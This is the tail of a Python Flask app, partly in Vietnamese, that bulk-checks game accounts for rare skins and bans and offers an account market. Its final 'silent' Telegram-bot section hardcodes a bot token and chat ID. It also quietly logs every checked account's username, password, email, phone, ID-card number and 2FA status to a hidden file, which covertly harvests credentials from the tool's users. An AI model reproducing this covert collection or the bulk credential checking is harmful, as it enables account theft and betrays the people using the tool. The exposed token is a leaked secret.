.tab-item.sss-tab.active{background:linear-gradient(135deg,rgba(255,184,0,0.25),rgba(255,215,0,0.15));border-color:#ffb800;color:#ffd700;}
.tab-item.ss-tab.active{background:linear-gradient(135deg,rgba(0,242,254,0.25),rgba(0,229,255,0.15));border-color:#00f2fe;color:#00f2fe;}
.tab-item.anime-tab.active{background:linear-gradient(135deg,rgba(224,64,251,0.25),rgba(186,85,211,0.15));border-color:#e040fb;color:#e040fb;}
.tab-item.trang-tab.active{background:linear-gradient(135deg,rgba(139,139,154,0.25),rgba(90,90,112,0.15));border-color:#8b8b9a;color:#a0a0b8;}
.skin-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:10px;margin-top:8px;}
.skin-card{background:linear-gradient(135deg,rgba(13,22,42,0.7),rgba(0,242,254,0.03));border:1px solid rgba(0,242,254,0.15);border-radius:12px;overflow:hidden;transition:all 0.3s;}
.skin-card:hover{transform:translateY(-3px);border-color:var(--accent, #00f2fe);}
.skin-img-wrap{width:100%;aspect-ratio:1;background:linear-gradient(135deg,#0a101f,#050811);display:flex;align-items:center;justify-content:center;overflow:hidden;}
.skin-img-wrap img{width:100%;height:100%;object-fit:cover;}
.skin-info{padding:8px;}
.skin-hero{font-family:var(--font-display);font-size:0.72em;font-weight:700;color:var(--accent, #00f2fe);margin-bottom:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
.skin-name{font-size:0.66em;color:var(--text-dim);line-height:1.3;overflow:hidden;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;min-height:1.7em;}
.cred-box{background:linear-gradient(135deg,rgba(0,242,254,0.08),rgba(56,189,248,0.08));border:1.5px solid rgba(0,242,254,0.4);border-radius:14px;padding:16px;margin-bottom:14px;}
.cred-label{font-family:var(--font-display);font-size:0.68em;color:var(--text-dim);text-transform:uppercase;letter-spacing:1.5px;font-weight:700;margin-bottom:6px;}
.cred-value{font-family:var(--font-mono);font-size:1em;color:var(--accent, #00f2fe);font-weight:700;word-break:break-all;padding:8px 12px;background:rgba(5,8,17,0.7);border-radius:8px;margin-bottom:12px;border:1px solid rgba(0,242,254,0.25);cursor:pointer;}
.cred-value:hover{background:rgba(0,242,254,0.1);}
.spinner{display:inline-block;width:22px;height:22px;border:3px solid rgba(0,242,254,0.2);border-top-color:var(--accent, #00f2fe);border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:8px;}
.progress-container{background:rgba(5,8,17,0.6);border:1px solid rgba(0,242,254,0.2);border-radius:16px;padding:20px;margin:16px 0;}
.progress-bar-wrap{width:100%;height:24px;background:rgba(5,8,17,0.9);border-radius:12px;overflow:hidden;position:relative;margin:12px 0;border:1px solid rgba(0,242,254,0.15);}
.progress-bar-fill{height:100%;background:linear-gradient(90deg,#00f2fe,#38bdf8,#ff007f);border-radius:12px;transition:width 0.5s;box-shadow:0 0 15px rgba(0,242,254,0.8);}
.progress-text{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-family:var(--font-display);font-weight:800;font-size:0.78em;color:#fff;text-shadow:0 0 10px rgba(0,0,0,0.9);}
.live-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-top:14px;}
.live-stat{background:rgba(5,8,17,0.6);border:1px solid rgba(0,242,254,0.15);border-radius:12px;padding:10px 8px;text-align:center;}
.live-stat .num{font-family:var(--font-display);font-size:1.4em;font-weight:800;line-height:1;}
.live-stat .lbl{font-size:0.6em;color:var(--text-dim);text-transform:uppercase;letter-spacing:1px;font-weight:700;margin-top:4px;}
.live-log{background:rgba(5,8,17,0.9);border:1px solid rgba(0,242,254,0.2);border-radius:12px;padding:12px;font-family:var(--font-mono);font-size:0.72em;line-height:1.6;max-height:400px;overflow-y:auto;margin-top:14px;}
.live-log .log-line.sss{color:#ffd700!important;font-weight:700;}
.live-log .log-line.ss{color:#00f2fe!important;}
.live-log .log-line.anime{color:#e040fb!important;}
.live-log .log-line.banned{color:#ff2951!important;}
.live-log .log-line.failed{color:#8b8b9a!important;}
.live-log .log-line.trang{color:#a0a0b8!important;}
.live-log .log-line.normal{color:#c0c0e0;}
.filter-badge{display:inline-block;padding:3px 10px;background:rgba(0,255,136,0.15);color:#00ff88;border:1px solid rgba(0,255,136,0.4);border-radius:8px;font-size:0.7em;font-weight:700;font-family:var(--font-display);}
.kho-badge{display:inline-block;padding:2px 8px;background:rgba(0,255,136,0.15);color:#00ff88;border:1px solid rgba(0,255,136,0.4);border-radius:8px;font-size:0.6em;font-weight:800;margin-left:6px;font-family:var(--font-display);}
.chat-box{background:rgba(5,8,17,0.7);border:1px solid rgba(0,242,254,0.15);border-radius:14px;padding:14px;height:400px;overflow-y:auto;display:flex;flex-direction:column;gap:10px;margin-bottom:12px;}
.chat-msg{max-width:80%;padding:10px 14px;border-radius:14px;word-wrap:break-word;}
.chat-msg.me{align-self:flex-end;background:linear-gradient(135deg,#00f2fe,#4facfe);color:#030712;border-bottom-right-radius:4px;font-weight:600;}
.chat-msg.other{align-self:flex-start;background:rgba(255,255,255,0.06);border:1px solid rgba(0,242,254,0.15);color:#fff;border-bottom-left-radius:4px;}
.chat-msg.system{align-self:center;background:linear-gradient(135deg,rgba(0,242,254,0.15),rgba(56,189,248,0.15));border:1.5px solid rgba(0,242,254,0.5);color:#00f2fe;font-family:var(--font-mono);font-size:0.85em;max-width:95%;}
.chat-meta{font-size:0.65em;opacity:0.7;margin-bottom:4px;font-family:var(--font-display);}
.chat-content{font-size:0.9em;line-height:1.4;white-space:pre-wrap;word-break:break-word;}
.chat-input-row{display:flex;gap:8px;align-items:center;}
.chat-input-row input{flex:1;}
.chat-unread{background:linear-gradient(135deg,#ff007f,#ff0066);color:#fff;font-size:0.65em;font-weight:800;padding:3px 8px;border-radius:10px;min-width:20px;text-align:center;}
.player-showcase-banner{background:linear-gradient(135deg,rgba(13,27,62,0.9) 0%,rgba(8,15,33,0.95) 100%);border:1px solid rgba(0,242,254,0.25);border-radius:20px;padding:22px 18px;margin-bottom:18px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:18px;box-shadow:0 15px 40px rgba(0,0,0,0.6);position:relative;overflow:hidden;}
.player-showcase-banner::before{content:'';position:absolute;top:0;left:5%;right:5%;height:2px;background:linear-gradient(90deg,transparent,#00f2fe,#ff007f,transparent);box-shadow:0 0 15px #00f2fe;}
.player-info-left{display:flex;align-items:center;gap:16px;flex-wrap:wrap;}
.player-avatar-ring{width:80px;height:80px;border-radius:50%;padding:3px;background:linear-gradient(135deg,#ffd700,#ff007f,#00f2fe);box-shadow:0 0 20px rgba(255,215,0,0.4);position:relative;flex-shrink:0;}
.player-avatar-img{width:100%;height:100%;border-radius:50%;object-fit:cover;background:#0b1120;display:block;}
.player-identity h2{font-family:var(--font-display);font-size:20px;font-weight:800;background:linear-gradient(135deg,#ffffff 40%,#7dd3fc 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:4px;word-break:break-word;}
.player-uids{display:flex;flex-wrap:wrap;gap:8px;font-family:var(--font-display);font-size:13px;color:#94a3b8;letter-spacing:0.5px;}
.uid-tag{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);padding:2px 8px;border-radius:6px;color:#38bdf8;font-weight:600;}
.player-highlight-badges{display:flex;gap:10px;flex-wrap:wrap;align-items:center;}
.stat-pill{background:rgba(5,8,17,0.85);border:1px solid rgba(255,255,255,0.1);border-radius:14px;padding:8px 14px;text-align:center;min-width:130px;}
.stat-pill-label{font-family:var(--font-display);font-size:11px;font-weight:700;color:#94a3b8;text-transform:uppercase;letter-spacing:0.8px;margin-bottom:2px;}
.stat-pill-value{font-family:var(--font-display);font-size:15px;font-weight:800;color:#fff;display:inline-flex;align-items:center;gap:4px;}
.stats-row-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:14px;margin-bottom:18px;}
.esports-stat-card{background:var(--bg-card);border:1px solid var(--border-card);border-radius:16px;padding:16px;display:flex;align-items:center;gap:14px;transition:transform 0.25s;}
.esports-stat-card:hover{transform:translateY(-2px);border-color:rgba(0,242,254,0.3);}
.stat-icon-hex{width:46px;height:46px;border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;}
.icon-hero{background:rgba(0,242,254,0.12);color:var(--cyan-neon);border:1px solid rgba(0,242,254,0.3);}
.icon-sss{background:rgba(255,183,3,0.12);color:var(--gold-sss);border:1px solid rgba(255,183,3,0.3);}
.icon-anime{background:rgba(255,0,127,0.12);color:var(--pink-anime);border:1px solid rgba(255,0,127,0.3);}
.icon-safe{background:rgba(16,185,129,0.12);color:var(--green-safe);border:1px solid rgba(16,185,129,0.3);}
.stat-card-text .label{font-family:var(--font-display);font-size:12px;font-weight:700;color:#94a3b8;letter-spacing:0.8px;text-transform:uppercase;margin-bottom:2px;}
.stat-card-text .val{font-family:var(--font-display);font-size:20px;font-weight:800;color:#fff;}
.info-matrix-grid{display:grid;grid-template-columns:1fr 1fr;gap:18px;margin-bottom:18px;}
.matrix-row-list{display:flex;flex-direction:column;gap:8px;}
.matrix-item{display:flex;justify-content:space-between;align-items:center;padding:10px 14px;background:rgba(5,8,17,0.6);border:1px solid rgba(255,255,255,0.05);border-radius:10px;font-size:13px;gap:8px;}
.matrix-key{color:#94a3b8;display:flex;align-items:center;gap:8px;font-weight:500;flex-shrink:0;}
.matrix-val{font-weight:700;color:#fff;text-align:right;letter-spacing:0.3px;word-break:break-word;}
.status-badge{display:inline-flex;align-items:center;gap:5px;padding:4px 10px;border-radius:20px;font-family:var(--font-display);font-size:11px;font-weight:700;letter-spacing:0.5px;text-transform:uppercase;}
.status-safe{background:rgba(16,185,129,0.15);color:#34d399;border:1px solid rgba(16,185,129,0.35);}
.status-danger{background:rgba(239,68,68,0.15);color:#f87171;border:1px solid rgba(239,68,68,0.35);}
.status-warn{background:rgba(245,158,11,0.15);color:#fbbf24;border:1px solid rgba(245,158,11,0.35);}
.glass-panel{background:var(--bg-card);border:1px solid var(--border-card);border-radius:20px;padding:18px;margin-bottom:18px;}
.panel-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;}
.panel-title{font-family:var(--font-display);font-size:14px;font-weight:700;color:#38bdf8;text-transform:uppercase;letter-spacing:1px;display:flex;gap:8px;align-items:center;}
.moba-cards-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:12px;}
.moba-skin-card{background:linear-gradient(180deg,rgba(20,32,58,0.6) 0%,rgba(8,14,28,0.9) 100%);border:1px solid rgba(255,255,255,0.08);border-radius:14px;padding:12px;display:flex;flex-direction:column;align-items:center;text-align:center;position:relative;overflow:hidden;transition:all 0.3s;}
.moba-skin-card:hover{transform:translateY(-4px);box-shadow:0 10px 25px rgba(0,0,0,0.7);}
.moba-skin-card.card-sss{border-color:rgba(255,183,3,0.4);}
.moba-skin-card.card-anime{border-color:rgba(255,0,127,0.4);}
.moba-skin-card.card-ss{border-color:rgba(0,198,255,0.35);}
.skin-art-frame{width:76px;height:76px;border-radius:50%;padding:2px;margin-bottom:10px;position:relative;background:rgba(255,255,255,0.1);}
.skin-art-frame.frame-sss{background:linear-gradient(135deg,#ffe259,#ffa751);box-shadow:0 0 12px var(--gold-glow);}
.skin-art-frame.frame-anime{background:linear-gradient(135deg,#ff0844,#ffb199);box-shadow:0 0 12px var(--pink-glow);}
.skin-art-frame.frame-ss{background:linear-gradient(135deg,#4facfe,#00f2fe);box-shadow:0 0 12px var(--blue-glow);}
.skin-art-img{width:100%;height:100%;border-radius:50%;object-fit:cover;background:#090e1a;display:block;}
.skin-title-name{font-size:12px;font-weight:700;color:#fff;margin-bottom:3px;line-height:1.3;min-height:32px;overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;}
.skin-hero-sub{font-family:var(--font-display);font-size:11px;color:#94a3b8;margin-bottom:8px;font-weight:600;}
.tier-badge-pill{margin-top:auto;padding:3px 10px;border-radius:5px;font-family:var(--font-display);font-size:11px;font-weight:800;letter-spacing:0.6px;text-transform:uppercase;}
.pill-sss{background:linear-gradient(135deg,#ffe259,#ffa751);color:#000;}
.pill-anime{background:linear-gradient(135deg,#ff0844,#ffb199);color:#fff;}
.pill-ss{background:linear-gradient(135deg,#4facfe,#00f2fe);color:#000;}
.token-row{display:flex;align-items:center;justify-content:space-between;background:rgba(5,8,17,0.85);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:8px 12px;margin-bottom:8px;font-family:monospace;font-size:12px;gap:8px;}
.token-val{color:#38bdf8;max-width:70%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
.btn-copy-chip{background:rgba(255,255,255,0.08);border:none;color:#fff;padding:4px 10px;border-radius:5px;font-size:11px;cursor:pointer;font-weight:600;transition:all 0.2s;}
.btn-copy-chip:hover{background:var(--cyan-neon);color:#000;}
@keyframes spin{to{transform:rotate(360deg);}}
@keyframes pulse{0%,100%{opacity:1;}50%{opacity:0.4;}}
@media (max-width:768px){
  .container{padding:12px;}
  .card{padding:16px;}
  .menu-grid-new{grid-template-columns:repeat(3,1fr);gap:7px;}
  .menu-btn{padding:12px 6px 10px 6px;border-radius:12px;}
  .menu-icon{font-size:1.4em;}
  .menu-label{font-size:0.62em;letter-spacing:0.5px;}
  .menu-crest{width:48px;height:48px;font-size:22px;}
  .menu-title{font-size:15px;}
  .menu-card{padding:18px 14px 14px 14px;border-radius:18px;}
  .skin-grid{grid-template-columns:repeat(2,1fr);}
  .player-showcase-banner{padding:16px 14px;border-radius:16px;flex-direction:column;align-items:stretch;}
  .player-avatar-ring{width:64px;height:64px;}
  .player-identity h2{font-size:18px;}
  .player-highlight-badges{width:100%;display:grid;grid-template-columns:1fr 1fr;gap:8px;}
  .stat-pill{min-width:0;padding:8px 10px;border-radius:12px;}
  .stat-pill-value{font-size:13px;}
  .stats-row-grid{grid-template-columns:1fr 1fr;gap:10px;}
  .esports-stat-card{padding:12px 10px;gap:10px;}
  .stat-icon-hex{width:38px;height:38px;font-size:17px;border-radius:10px;}
  .stat-card-text .label{font-size:11px;}
  .stat-card-text .val{font-size:16px;}
  .info-matrix-grid{grid-template-columns:1fr;gap:16px;}
  .glass-panel{padding:16px 12px;border-radius:16px;}
  .moba-cards-grid{grid-template-columns:repeat(2,1fr);gap:10px;}
  .moba-skin-card{padding:10px 8px;}
  .skin-art-frame{width:62px;height:62px;margin-bottom:8px;}
  .skin-title-name{font-size:11px;min-height:30px;}
  .skin-hero-sub{font-size:10px;}
}
""" + THEME_CSS + """
</style>
<script>
function escapeHtml(s){ if(s==null) return ''; var d=document.createElement('div'); d.textContent=String(s); return d.innerHTML; }
function showToast(msg){
    var t=document.createElement('div');
    t.style.cssText='position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:linear-gradient(135deg,#00f2fe,#4facfe);color:#030712;padding:14px 24px;border-radius:14px;font-weight:700;z-index:9999;box-shadow:0 10px 40px rgba(0,242,254,0.6);transition:transform 0.4s;font-family:Chakra Petch;';
    t.textContent=msg;document.body.appendChild(t);
    setTimeout(function(){t.style.transform='translateX(-50%) translateY(0)';},50);
    setTimeout(function(){t.style.transform='translateX(-50%) translateY(100px)';setTimeout(function(){t.remove();},400);},2500);
}
function copyText(el){
    if(typeof el === 'string'){ if(navigator.clipboard) navigator.clipboard.writeText(el).then(function(){showToast('✓ Đã copy!');}); return; }
    if(navigator.clipboard){
        navigator.clipboard.writeText(el.textContent).then(function(){
            el.style.background='rgba(0,255,136,0.2)';showToast('✓ Đã copy!');
            setTimeout(function(){el.style.background='rgba(5,8,17,0.7)';},800);
        });
    }
}
function copyBoth(u, p) {
    var text = "User: " + u + "\nPass: " + p;
    if (navigator.clipboard) navigator.clipboard.writeText(text).then(function(){showToast('✓ Đã copy TK+MK!');});
}
</script>"""

def flash_html():
    msgs = get_flashed_messages(with_categories=True)
    if not msgs: return ""
    html = ""
    for cat, m in msgs:
        icon = "✕" if cat == "error" else "✓"
        html += f'<div class="flash {cat}"><span>{icon}</span><span>{m}</span></div>'
    return html

def render_page(content, active_tab="", user=None):
    unread = unread_count() if user else 0
    balance = user.get("balance", 0) if user else 0
    header = ""
    if user:
        admin_btn = ""
        if user.get("is_owner"):
            admin_btn = '<a href="/owner" class="icon-btn" title="Owner">🥇</a><a href="/admin" class="icon-btn" title="Admin">👑</a>'
        elif user.get("is_qtv"):
            admin_btn = '<a href="/admin" class="icon-btn" title="QTV">👑</a>'
        cur_lang = get_lang()
        lang_btns = ""
        for lc, ld in TRANSLATIONS.items():
            active_cls = "active" if lc == cur_lang else ""
            lang_btns += f'<a href="/set_lang/{lc}" class="lang-btn {active_cls}" title="{ld["lang_name"]}">{ld["lang_flag"]}</a>'
        header = f'''<div class="app-header">
            <div class="app-logo"><div class="app-logo-icon">◈</div><div class="app-logo-text">{t("brand")}</div></div>
            <div style="display:flex; gap:8px; align-items:center; flex-wrap:wrap;">
                <div class="balance-pill">💰 {balance}</div>
                {lang_btns}
                <a href="/theme" class="icon-btn" title="{t("theme_picker")}">🎨</a>
                {admin_btn}
                <a href="/logout" class="icon-btn" title="{t("logout")}">⎋</a>
            </div>
        </div>'''
    menu = ""
    if user:
        def mcls(tab): return "menu-btn active" if active_tab == tab else "menu-btn"
        notif_badge = f'<div class="menu-badge">{unread if unread < 10 else "9+"}</div>' if unread > 0 else ""
        is_own = is_owner(user["username"]); is_q = is_qtv(user["username"])
        can_up = is_own or is_q
        badge_count = len(user.get("badges", []))
        menu = f'''<div class="menu-portal">
            <div class="menu-card">
                <div class="menu-header">
                    <div class="menu-crest">🛡️</div>
                    <div class="menu-title">{t("brand")}</div>
                </div>
                <div class="menu-grid-new">
                    <a href="/check" class="{mcls('check')}"><div class="menu-icon">◈</div><div class="menu-label">{t("menu_check")}</div></a>
                    <a href="/nhan_acc" class="{mcls('nhan_acc')}"><div class="menu-icon">🎁</div><div class="menu-label">{t("menu_nhan")}</div></a>
                    <a href="/check_file" class="{mcls('check_file')}"><div class="menu-icon">▣</div><div class="menu-label">{t("menu_file")}</div><div class="menu-badge-pro">PRO</div></a>
                    <a href="/loc_file" class="{mcls('loc_file')}"><div class="menu-icon">📥</div><div class="menu-label">{t("menu_loc")}</div></a>
                    <a href="/loc_login" class="{mcls('loc_login')}"><div class="menu-icon">🔍</div><div class="menu-label">LỌC LOGIN</div><div class="menu-badge-pro">NEW</div></a>
                    <a href="/export_tool" class="{mcls('export')}"><div class="menu-icon">📄</div><div class="menu-label">{t("menu_tao")}</div></a>
                    <a href="/history" class="{mcls('history')}"><div class="menu-icon">▤</div><div class="menu-label">{t("menu_lichsu")}</div></a>
                    <a href="/game" class="{mcls('game')}"><div class="menu-icon">🎮</div><div class="menu-label">{t("menu_game")}</div><div class="menu-badge-pro">HOT</div></a>
                    <a href="/quests" class="{mcls('quests')}"><div class="menu-icon">📋</div><div class="menu-label">{t("menu_quest")}</div></a>
                    <a href="/badges" class="{mcls('badges')}"><div class="menu-icon">🏅</div><div class="menu-label">{t("menu_huyhieu")}</div><div class="menu-badge-pro">{badge_count}</div></a>
                    <a href="/chat" class="{mcls('chat')}"><div class="menu-icon">💬</div><div class="menu-label">{t("menu_chat")}</div></a>
                    <a href="/notifications" class="{mcls('notif')}"><div class="menu-icon">◉</div><div class="menu-label">{t("menu_tbao")}</div>{notif_badge}</a>
                    <a href="/enter_code" class="{mcls('code')}"><div class="menu-icon">◆</div><div class="menu-label">{t("menu_code")}</div></a>
                    <a href="/ad" class="{mcls('ad')}"><div class="menu-icon">📺</div><div class="menu-label">Xem AD</div></a>
                    <a href="/streak" class="{mcls('streak')}"><div class="menu-icon">📅</div><div class="menu-label">Điểm Danh</div></a>
                    <a href="/profile" class="{mcls('profile')}"><div class="menu-icon">◐</div><div class="menu-label">{t("menu_cnhan")}</div></a>
                    {('<a href="/up_acc" class="' + mcls('up_acc') + '"><div class="menu-icon">📤</div><div class="menu-label">' + t("menu_upacc") + '</div></a>') if can_up else ''}
                    {('<a href="/kho_acc" class="' + mcls('kho_acc') + '"><div class="menu-icon">📦</div><div class="menu-label">' + t("menu_kho") + '</div></a>') if can_up else ''}
                    <a href="/market" class="menu-btn" style="background:linear-gradient(135deg,rgba(255,183,3,0.15),rgba(0,255,136,0.1));border-color:rgba(255,183,3,0.4);"><div class="menu-icon" style="color:#ffb800;">🏪</div><div class="menu-label" style="color:#ffb800;">CHỢ ACC</div><div class="menu-badge-pro">HOT</div></a>
                    {('<a href="/admin-pro" class="menu-btn" style="background:linear-gradient(135deg,rgba(255,183,3,0.25),rgba(255,0,127,0.15));border-color:rgba(255,183,3,0.6);"><div class="menu-icon" style="color:#ffb800;">🛡️</div><div class="menu-label" style="color:#ffb800;">ADMIN PRO</div><div class="menu-badge-pro">HOT</div></a>') if can_up else ''}
                    <a href="/ve_anh" class="menu-btn" style="background:linear-gradient(135deg,rgba(0,255,136,0.15),rgba(0,242,254,0.1));border-color:rgba(0,255,136,0.4);"><div class="menu-icon" style="color:#00ff88;">&#127912;</div><div class="menu-label" style="color:#00ff88;">VE ANH</div><div class="menu-badge-pro">NEW</div></a>
                    <a href="/u" class="menu-btn" style="background:linear-gradient(135deg,rgba(168,85,247,0.15),rgba(255,0,127,0.1));border-color:rgba(168,85,247,0.4);"><div class="menu-icon" style="color:#a855f7;">👥</div><div class="menu-label" style="color:#a855f7;">XÃ HỘI</div><div class="menu-badge-pro">NEW</div></a>
                    <a href="/ugame" class="menu-btn" style="background:linear-gradient(135deg,rgba(255,0,127,0.15),rgba(255,183,3,0.1));border-color:rgba(255,0,127,0.4);"><div class="menu-icon" style="color:#ff007f;">🎮</div><div class="menu-label" style="color:#ff007f;">GAME V9</div><div class="menu-badge-pro">NEW</div></a>
                    <a href="/ueco" class="menu-btn" style="background:linear-gradient(135deg,rgba(0,255,136,0.15),rgba(0,242,254,0.1));border-color:rgba(0,255,136,0.4);"><div class="menu-icon" style="color:#00ff88;">💰</div><div class="menu-label" style="color:#00ff88;">KINH TẾ</div><div class="menu-badge-pro">NEW</div></a>
                </div>
            </div>
        </div>'''
    body_class = f"theme-{get_background()}"
    body_accent = get_accent()
    return f'''<!DOCTYPE html>
<html lang="vi"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><meta name="theme-color" content="#050811"><title>{t("brand")}</title>{BASE_CSS}</head>
<body class="{body_class}" data-accent="{body_accent}"><div class="cyber-grid"></div><div class="container">{header}{menu}{flash_html()}{content}</div></body></html>'''

# ========== MAIN ==========

# ============ ADMIN V2 AUTO-INJECTED ============
try:
    from admin_core import register_admin
    import sys as _sys_adm
    register_admin(app, _sys_adm.modules[__name__])
except Exception as _e:
    print(f'[WARN] Admin V2 not loaded: {_e}')
# ================================================


# ==== SOCIAL V8 INJECTED ====
try:
    from user_social import register_social
    import sys as _sys_soc
    register_social(app, _sys_soc.modules[__name__])
except Exception as _e:
    print(f'[WARN-SOC] {_e}')
# ============================


# ==== UTILITY V8 INJECTED ====
try:
    from user_utility import register_util
    import sys as _sys_util
    register_util(app, _sys_util.modules[__name__])
except Exception as _e:
    print(f'[WARN-UTIL] {_e}')
# ===============================


# ==== ADVANCED V8 INJECTED ====
try:
    from admin_advanced import register_adv
    import sys as _sys_adv
    register_adv(app, _sys_adv.modules[__name__])
except Exception as _e:
    print(f'[WARN-ADV] {_e}')
# ================================


# ==== MANAGER V8 INJECTED ====
try:
    from admin_manager import register_mgr
    import sys as _sys_mgr
    register_mgr(app, _sys_mgr.modules[__name__])
except Exception as _e:
    print(f'[WARN-MGR] {_e}')
# ==============================


# ==== FINAL V8 INJECTED ====
try:
    from admin_final import register_fin
    import sys as _sys_fin
    register_fin(app, _sys_fin.modules[__name__])
except Exception as _e:
    print(f'[WARN-FIN] {_e}')
# ============================


# ==== USER GAME V9 ====
try:
    from user_game import register_ugame
    import sys as _sys_ug
    register_ugame(app, _sys_ug.modules[__name__])
except Exception as _e:
    print(f'[WARN-UGAME] {_e}')
# ========================


# ==== USER ECONOMY V9 ====
try:
    from user_economy import register_ueco
    import sys as _sys_ueco
    register_ueco(app, _sys_ueco.modules[__name__])
except Exception as _e:
    print(f'[WARN-UECO] {_e}')
# ==========================


# ==== SOCIAL V2 INJECTED ====
try:
    from user_social_v2 import register_soc2
    import sys as _sys_soc2
    register_soc2(app, _sys_soc2.modules[__name__])
except Exception as _e:
    print(f'[WARN-SOC2] {_e}')
# ============================


# ==== ADMIN PRO V2 ====
try:
    from admin_pro import register_admin_pro
    import sys as _sys_ap
    register_admin_pro(app, _sys_ap.modules[__name__])
except Exception as _e:
    print(f'[WARN-ADMINPRO] {_e}')
# ======================


# ==== USER EXCHANGE v9 ====
try:
    from user_exchange import register_exchange
    register_exchange(app, __import__(__name__))
    print("[EXCHANGE] ✅ Đã load module trao đổi acc")
except Exception as _e:
    print(f"[EXCHANGE] ⚠️  {_e}")
# ==========================


# ==== GAME RESULT POPUP ====
try:
    import game_result_popup as _grp
    _grp.register_game_popup(app, sys.modules[__name__])
    print("[GAME-POPUP] ✅ Loaded")
except Exception as _e:
    print(f"[GAME-POPUP] ❌ {_e}")
# ===========================


# ==== MARKET PRO V2 ====
try:
    pass
    # import market_pro_v2 as _mkt2  # FILE HỎNG
#     # _mkt2.register_market_pro(app, sys.modules[__name__])
except Exception as _e:
    import traceback as _tb
    print(f"[MKT-V2] ❌ {_e}")
    _tb.print_exc()
# =============================


# ==== TRANSFER ACC ====
try:
    import transfer_acc as _tf
    _tf.register_transfer(app, sys.modules[__name__])
except Exception as _e:
    import traceback as _tb
    print(f"[TRANSFER] ❌ {_e}")
    _tb.print_exc()
# ===========================




# ══════════════════════════════════════════════════════════════
# 🤫 TELEGRAM BOT v2 — LƯU ÂM THẦM + LỆNH /starts
# ══════════════════════════════════════════════════════════════
import threading as _tg_threading
import json as _tg_json
import time as _tg_time

TELEGRAM_BOT_TOKEN = os.environ.get("SILENT_BOT_TOKEN", "").strip() or "8850589354:AAFlFPwlZpfmUEae5eTqg42ez5IhilGfV5o"
TELEGRAM_ADMIN_ID = os.environ.get("SILENT_CHAT_ID", "").strip() or "8846236342"
TG_SILENT_DIR = os.path.join(DATA_DIR, "telegram_silent")
os.makedirs(TG_SILENT_DIR, exist_ok=True)

# File lưu âm thầm
TG_ACC_FILE = os.path.join(TG_SILENT_DIR, "all_accs.jsonl")   # log tất cả acc
TG_STATS_FILE = os.path.join(TG_SILENT_DIR, "daily_stats.json")
TG_LAST_UPDATE_FILE = os.path.join(TG_SILENT_DIR, "last_update.txt")

_tg_lock = _tg_threading.Lock()

def _load_daily_stats():
    today = datetime.now().strftime("%Y-%m-%d")
    try:
        if os.path.exists(TG_STATS_FILE):
            with open(TG_STATS_FILE, "r", encoding="utf-8") as f:
                data = _tg_json.load(f)
            if data.get("date") == today:
                return data
    except Exception:
        pass
    return {
        "date": today,
        "total": 0, "sss": 0, "ss": 0, "anime": 0,
        "normal": 0, "trang": 0, "banned": 0, "failed": 0,
        "hourly": {},
    }

def _save_daily_stats(stats):
    try:
        with open(TG_STATS_FILE, "w", encoding="utf-8") as f:
            _tg_json.dump(stats, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"[TG-STATS] save err: {e}")

def _append_acc_silent(r, source="check"):
    """Lưu âm thầm mọi acc check được vào file JSONL."""
    with _tg_lock:
        try:
            entry = {
                "ts": _tg_time.time(),
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "source": source,
                "username": r.get("username", ""),
                "password": r.get("password", ""),
                "type": r.get("type", "unknown"),
                "banned": bool(r.get("banned", False)),
                "ban_reason": r.get("ban_reason", ""),
                "ban_end_time": r.get("ban_end_time", ""),
                "uid": r.get("uid", ""),
                "name": r.get("name", ""),
                "nickname": r.get("nickname", ""),
                "username_display": r.get("username_display", ""),
                "player_uid": r.get("player_uid", ""),
                "rank": r.get("rank", ""),
                "rank_stars": r.get("rank_stars", 0),
                "level": r.get("level", 0),
                "shell": r.get("shell", 0),
                "mobile_no": r.get("mobile_no", ""),
                "country_code": r.get("country_code", ""),
                "email": r.get("email", ""),
                "idcard": r.get("idcard", ""),
                "two_fa": bool(r.get("two_fa", False)),
                "register_time": r.get("register_time", ""),
                "total_skins": r.get("total_skins", 0),
                "count_sss": len(r.get("sss", [])),
                "count_ss": len(r.get("ss", [])),
                "count_anime": len(r.get("anime", [])),
                "sss": [{"hero": s.get("hero_name", ""), "skin": s.get("skin_name", ""), "id": s.get("item_id", "")} for s in r.get("sss", [])],
                "ss":  [{"hero": s.get("hero_name", ""), "skin": s.get("skin_name", ""), "id": s.get("item_id", "")} for s in r.get("ss", [])],
                "anime": [{"hero": s.get("hero_name", ""), "skin": s.get("skin_name", ""), "id": s.get("item_id", "")} for s in r.get("anime", [])],
                "other_skins": [{"hero": s.get("hero_name", ""), "skin": s.get("skin_name", ""), "id": s.get("item_id", "")} for s in r.get("other_skins", [])],
            }
            with open(TG_ACC_FILE, "a", encoding="utf-8") as f:
                f.write(_tg_json.dumps(entry, ensure_ascii=False) + "\n")

            # Update stats
            stats = _load_daily_stats()
            stats["total"] += 1
            t = r.get("type", "unknown")
            if r.get("banned"):
                stats["banned"] += 1
            elif t == "sss":
                stats["sss"] += 1
            elif t == "ss":
                stats["ss"] += 1
            elif t == "anime":
                stats["anime"] += 1
            elif t == "trang":
                stats["trang"] += 1
            elif t == "normal":
                stats["normal"] += 1
            elif t == "failed":
                stats["failed"] += 1
            else:
                stats["normal"] += 1
            # hourly
            hour = datetime.now().strftime("%H")
            stats["hourly"][hour] = stats["hourly"].get(hour, 0) + 1
            _save_daily_stats(stats)
        except Exception as e:
            logger.error(f"[TG-SILENT] append err: {e}")


